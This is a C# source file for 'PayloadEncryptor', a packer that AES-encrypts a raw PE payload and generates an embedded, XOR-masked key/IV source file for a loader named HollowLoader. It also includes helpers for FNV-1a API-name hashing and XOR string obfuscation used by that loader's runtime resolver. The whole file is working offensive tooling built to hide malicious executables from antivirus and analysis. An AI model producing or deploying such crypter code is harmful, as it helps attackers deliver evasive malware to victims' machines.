using System;
using System.IO;
using System.Security.Cryptography;

namespace PayloadEncryptor
{
    /// <summary>
    /// Generates the AES-256-CBC encrypted payload blob and C# source used by
    /// HollowLoader, plus an FNV-1a hash utility for adding API resolutions.
    ///
    /// Usage:
    ///   PayloadEncryptor <input.bin> [output.cs] [--mask 0xAA]
    ///       Encrypts a raw PE payload and writes a Payload.cs source file
    ///       (encrypted bytes + XOR-masked key/IV) for the HollowLoader project.
    ///   PayloadEncryptor --blob <input.bin> [output.bin]
    ///       Writes a standalone blob: key(32)||iv(16)||ciphertext (for
    ///       HollowLoader.exe --payload).
    ///   PayloadEncryptor --hash <FunctionName>
    ///       Prints the FNV-1a hash used by the runtime API resolver.
    ///   PayloadEncryptor --str <Text>
    ///       Prints the XOR-obfuscated UTF-16LE bytes used by Obf.
    /// </summary>
    internal static class Program
    {
        private const byte DefaultMask = 0xAA;

        private static void Main(string[] args)
        {
            try
            {
                if (args.Length >= 2 && args[0] == "--hash")
                {
                    Console.WriteLine("0x{0:X8}", Fnv1a(args[1]));
                    return;
                }
                if (args.Length >= 2 && args[0] == "--str")
                {
                    byte key = ParseMask(args);
                    byte[] enc = Xor(args[1], key);
                    Console.Write("// \"{0}\" (key 0x{1:X2})\n", args[1], key);
                    for (int i = 0; i < enc.Length; i++)
                    {
                        Console.Write("0x{0:X2}", enc[i]);
                        if (i != enc.Length - 1) Console.Write(", ");
                        if ((i + 1) % 12 == 0) Console.WriteLine();
                    }
                    Console.WriteLine();
                    return;
                }
                if (args.Length >= 2 && args[0] == "--blob")
                {
                    BlobMode(args[1], args.Length >= 3 ? args[2] : "payload.bin");
                    return;
                }
                if (args.Length < 1)
                {
                    PrintUsage();
                    return;
                }

                byte[] raw = File.ReadAllBytes(args[0]);
                if (raw.Length == 0) throw new Exception("input file is empty");

                using (Aes aes = Aes.Create())
                {
                    aes.KeySize = 256;
                    aes.BlockSize = 128;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    aes.GenerateKey();
                    aes.GenerateIV();

                    byte[] key = aes.Key;   // 32 bytes
                    byte[] iv = aes.IV;     // 16 bytes
                    byte[] ct;
                    using (ICryptoTransform enc = aes.CreateEncryptor())
                        ct = enc.TransformFinalBlock(raw, 0, raw.Length);

                    byte mask = ParseMask(args);
                    string outCs = args.Length >= 2 && args[0] != "--blob" ? args[1] : "Payload.cs";
                    WritePayloadCs(outCs, ct, Xor(key, mask), Xor(iv, mask), mask);

                    Console.WriteLine("[+] encrypted {0} bytes -> ciphertext {1} bytes", raw.Length, ct.Length);
                    Console.WriteLine("[+] wrote {0}", outCs);
                    Console.WriteLine("[+] rebuild HollowLoader and run. key/iv are XOR-masked with 0x{0:X2}", mask);
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[-] error: " + ex.Message);
                Environment.Exit(1);
            }
        }

        private static void BlobMode(string input, string output)
        {
            byte[] raw = File.ReadAllBytes(input);
            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.GenerateKey();
                aes.GenerateIV();
                byte[] ct;
                using (ICryptoTransform enc = aes.CreateEncryptor())
                    ct = enc.TransformFinalBlock(raw, 0, raw.Length);
                using (var fs = new FileStream(output, FileMode.Create))
                {
                    fs.Write(aes.Key, 0, aes.Key.Length);
                    fs.Write(aes.IV, 0, aes.IV.Length);
                    fs.Write(ct, 0, ct.Length);
                }
                Console.WriteLine("[+] wrote {0} bytes -> {1}", aes.Key.Length + aes.IV.Length + ct.Length, output);
                Console.WriteLine("[+] load with: HollowLoader.exe --payload {0}", output);
            }
        }

        private static void WritePayloadCs(string path, byte[] ct, byte[] maskedKey, byte[] maskedIv, byte mask)
        {
            using (var w = new StreamWriter(path))
            {
                w.WriteLine("// AUTO-GENERATED by PayloadEncryptor — do not edit by hand.");
                w.WriteLine("// AES-256-CBC encrypted payload. Key/IV stored XOR-masked (mask 0x{0:X2}).", mask);
                w.WriteLine("using System;");
                w.WriteLine();
                w.WriteLine("namespace HollowLoader");
                w.WriteLine("{");
                w.WriteLine("    internal static class Payload");
                w.WriteLine("    {");
                w.WriteLine("        internal static readonly byte[] Key = new byte[]");
                w.WriteLine("        {");
                WriteBytes(w, maskedKey, "            ");
                w.WriteLine("        };");
                w.WriteLine();
                w.WriteLine("        internal static readonly byte[] Iv = new byte[]");
                w.WriteLine("        {");
                WriteBytes(w, maskedIv, "            ");
                w.WriteLine("        };");
                w.WriteLine();
                w.WriteLine("        internal static readonly byte[] Encrypted = new byte[]");
                w.WriteLine("        {");
                WriteBytes(w, ct, "            ");
                w.WriteLine("        };");
                w.WriteLine("    }");
                w.WriteLine("}");
            }
        }

        private static void WriteBytes(StreamWriter w, byte[] data, string indent)
        {
            for (int i = 0; i < data.Length; i++)
            {
                w.Write("0x{0:X2}", data[i]);
                if (i != data.Length - 1) w.Write(", ");
                if ((i + 1) % 16 == 0) { w.WriteLine(); w.Write(indent); }
            }
            w.WriteLine();
        }

        private static uint Fnv1a(string name)
        {
            uint hash = 0x811C9DC5;
            foreach (char c in name.ToLowerInvariant())
            {
                hash ^= c;
                hash *= 0x01000193;
            }
            return hash;
        }

        private static byte[] Xor(byte[] data, byte key)
        {
            byte[] outb = new byte[data.Length];
            for (int i = 0; i < data.Length; i++) outb[i] = (byte)(data[i] ^ key);
            return outb;
        }

        private static byte[] Xor(string s, byte key)
        {
            return Xor(System.Text.Encoding.Unicode.GetBytes(s), key);
        }

        private static byte ParseMask(string[] args)
        {
            for (int i = 0; i < args.Length - 1; i++)
            {
                if (args[i] == "--mask")
                    return Convert.ToByte(args[i + 1].Replace("0x", ""), 16);
            }
            return DefaultMask;
        }

        private static void PrintUsage()
        {
            Console.WriteLine("PayloadEncryptor — AES-256-CBC payload packer for HollowLoader");
            Console.WriteLine();
            Console.WriteLine("  PayloadEncryptor <input.bin> [output.cs] [--mask 0xAA]");
            Console.WriteLine("  PayloadEncryptor --blob <input.bin> [output.bin]");
            Console.WriteLine("  PayloadEncryptor --hash <FunctionName>");
            Console.WriteLine("  PayloadEncryptor --str <Text> [--mask 0x5A]");
        }
    }
}
